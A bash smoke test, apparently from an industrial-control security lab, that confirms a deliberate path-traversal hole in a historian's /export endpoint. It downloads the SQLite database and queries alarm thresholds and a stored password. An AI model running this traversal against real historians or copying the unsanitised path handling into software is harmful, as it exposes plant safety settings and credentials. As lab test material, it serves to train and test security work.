#!/usr/bin/env bash
# /export?tag=<value> joins the value into the export path without
# sanitisation. Tag traversal returns the raw SQLite database, which holds
# the alarm_config and config tables. Reachable from operational zone.
#
# Coverage:
#   GET /assets returns the asset list (no auth)
#   GET /export?tag=../historian.db returns SQLite magic bytes (binary)
#   the downloaded DB has the alarm_config and config tables visible to sqlite3
#
# Usage: bash tests/smoke/test_historian_path_traversal.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ENT_WS="bursar-desk"   # bursar-desk has direct ops zone access
HISTORIAN="uupl-historian"

for c in "$ENT_WS" "$HISTORIAN"; do
    require_running "$c"
done

echo "[hist-trav] Waiting for uupl-historian..."
wait_for_port "$ENT_WS" 10.10.2.10 8080 30 || fail "uupl-historian :8080 not ready from bursar-desk"

echo "[hist-trav] Stage 1: /assets returns asset list (no auth)"

ASSETS="$(in_container "$ENT_WS" curl -sf -m 5 http://10.10.2.10:8080/assets 2>&1)"
assert_contains "$ASSETS" "turbine_rpm|turbine_main" \
    "/assets returns at least one turbine asset name"

echo "[hist-trav] Stage 2: /export?tag=../historian.db returns SQLite magic bytes"

# Same approach as ent-to-trip Stage 3d: pull the file then read magic bytes
# via python so bash command substitution does not eat the null bytes.
MAGIC_OUT="$(in_container "$ENT_WS" sh -c '
curl -sf -m 5 "http://10.10.2.10:8080/export?tag=../historian.db" -o /tmp/h.db
python3 -c "
with open(\"/tmp/h.db\",\"rb\") as f:
    head = f.read(16)
print(\"MAGIC=SQLite\" if head.startswith(b\"SQLite format 3\") else \"MAGIC=OTHER:\"+repr(head))
"
SIZE=$(wc -c </tmp/h.db)
echo "SIZE=$SIZE"
rm -f /tmp/h.db
')"
assert_contains "$MAGIC_OUT" "MAGIC=SQLite" "downloaded body has SQLite magic"

# A fresh historian.db with 30 days of readings is well over 100 KB. A
# tiny file would mean a 404 / error body that happened to have SQLite
# magic by accident, which we want to rule out.
SIZE="$(printf '%s' "$MAGIC_OUT" | sed -n 's/^SIZE=//p')"
if [ "${SIZE:-0}" -gt 100000 ]; then
    ok "downloaded DB is plausible size (${SIZE} bytes)"
else
    fail "downloaded DB is suspiciously small (${SIZE:-?} bytes)"
fi

echo "[hist-trav] Stage 3: sqlite3 against downloaded DB (mirrors runbook)"

# The runbook says: after downloading, run sqlite3 queries against the file.
# bursar-desk has sqlite3 installed (added during the audit pass), so we can
# exercise the runbook's exact .tables / SELECT commands instead of routing
# the same data discovery through SQLi.
SQL_OUT="$(in_container "$ENT_WS" sh -c '
curl -sf -m 5 "http://10.10.2.10:8080/export?tag=../historian.db" -o /tmp/h.db
echo "==== .tables ===="
sqlite3 /tmp/h.db ".tables"
echo "==== alarm_config ===="
sqlite3 /tmp/h.db "SELECT tag, hi_hi, unit FROM alarm_config;"
echo "==== config ===="
sqlite3 /tmp/h.db "SELECT key, value FROM config;"
rm -f /tmp/h.db
')"
assert_contains "$SQL_OUT" "alarm_config" "sqlite3 .tables lists alarm_config"
assert_contains "$SQL_OUT" "config"       "sqlite3 .tables lists config"
assert_contains "$SQL_OUT" "turbine_rpm.*3300" \
    "sqlite3 SELECT FROM alarm_config returns overspeed threshold (3300 RPM)"
assert_contains "$SQL_OUT" "Historian2015" \
    "sqlite3 SELECT FROM config returns stored password"

summary